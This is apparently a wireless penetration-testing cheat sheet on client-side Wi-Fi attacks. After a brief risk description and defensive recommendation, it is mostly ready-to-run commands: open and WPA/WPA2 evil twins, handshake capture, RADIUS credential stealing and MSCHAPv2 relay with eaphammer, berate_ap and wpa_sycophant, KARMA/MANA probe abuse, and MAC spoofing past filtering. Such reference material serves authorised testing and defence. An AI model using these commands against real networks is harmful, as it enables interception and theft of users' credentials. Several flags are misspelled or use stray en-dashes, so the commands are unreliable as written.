## Open Network Impersonation (Client Attacks)
An attacker discovered an open network that is currently in use. Open networks pose a significant security risk due to their lack of integrity assurance. An attacker can impersonate the open network, luring users into the attacker's network. An attacker can also conduct a DoS attack against the corporate network, which will cause the targeted devices to seek out alternative networks to connect to, leading the victim devices to connect to the attacker's imposter network. A Rogue AP refers to an access point installed on a secure network without the explicit permission of a system administrator. Such devices can pose a severe security threat, as anyone accessing the premises may inadvertently or intentionally install a low-cost wireless AP, allowing unauthorized parties to access the network. 

Recommendation:
To compensate for the lack of Layer 2 security, organizations need to implement more robust defenses at the upper layers. One way to limit the SSIDs that client devices connect to is by utilizing Group Policy functions and forbidding the connection to the 'ANY' SSID. By doing so, end-users won't be able to connect to wireless networks that are not considered trustworthy. Educating users on the significance of confirming the identity of digital certificates before supplying sensitive information, ensuring that the root or issuing authority for the digital certificate is trusted.

### Rogue AP Process:

    1. Check whether SSID is Visible or not
    2. Sniff for IP range if SSID is visible then check the status of MAC Filtering.
    3. If MAC filtering is enabled then spoof the MAC Address by using tools such as SMAC
    4. Try to connect to AP using IP within the discovered range.
    5. If SSID is hidden then discover the SSID using Aircrack-ng and follow the procedure of visible SSID which was declared above.

### Basic Open Hotspot
    $ berate_ap  <interface_AP> <interface_internet> <SSID>
    
### Open Network Evil Twin
    $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID>
     
     Could use the following tools: airgeddon.sh, fluxion.sh, wifipumpkin3

### WPA/WPA2-Personal Evil Twin
   WPA Passphrase Known:
   
       $ eaphammer -i wlan0 --channel <channel_number> --auth wpa-psk \ --essid <SSID> --wpa-passphrase <passphrase>
        
   WPA Passphrase Unknown:
   
    1. Spawn Open Network Evil Twin instead to attack clients (e.g. Phishing attack to retrieve Passphrase) 
    2. Capture WPA (half) Handshake of connecting clients & Cracking
        $ eaphammer -i wlan0 --channel <channel_number> --auth wpa-psk \ --essid <SSID> --wpa-passphrase randompassphrase --capture-wpa-handhshake

### WPA/WPA2-Enterprise Evil Twin
   RADIUS Credentials Unknown:
   
    # RADIUS Credentials Stealing
        Possible if EAP method does not use client-certificate for client authentication.
            $ eaphammer --cert-wizard
            $ eaphammer -i wlan0 --channel --auth wpa-eap \ --essid <SSID> --creds
    
    # EAP (MSCHAPv2) Relay
        Possible if target network uses EAP method with MSCHAPv2 for client authentication.
            $ berate_ap --eap --mana-wpe --wpa-sycophant --mana-credout <file_captured_creds>\ <interface_AP> <interface_internet> <SSID>
            $ wpa_sycophant.sh -c wpa_sycophant_example.conf -i <interface>

   RADIUS Credentials Known:
   
    $ ehdb --add --identity <username> --password <password> # Add credentials in db
    $ ehdb --add --identity <username> --nt-hash <ntlm_hash> # Add creds with NTLM hash in db
    $ eaphammer -i wlan0 --channel <channel_number> --auth wpa-eap \ --essid <SSID_corporate_wifi>

### 802.11 Network Selection Algorithms Abuse (for Open Network)
    Abuse clients' passive scanning with known Beacons Attack:
        $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID> --mana –known-beacons

    Abuse clients' active probing:
    
      # KARMA Attack (outdated) By default with wifiphisher
        $ sudo wifiphisher
        
      # MANA Attack (KARMA improvement)
        $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID> --mana
        
      # Loud MANA (MANA Improvement) 
        $ eaphammer -i wlan0 --channel <channel_number> --auth open --essid <SSID> --mana –loud
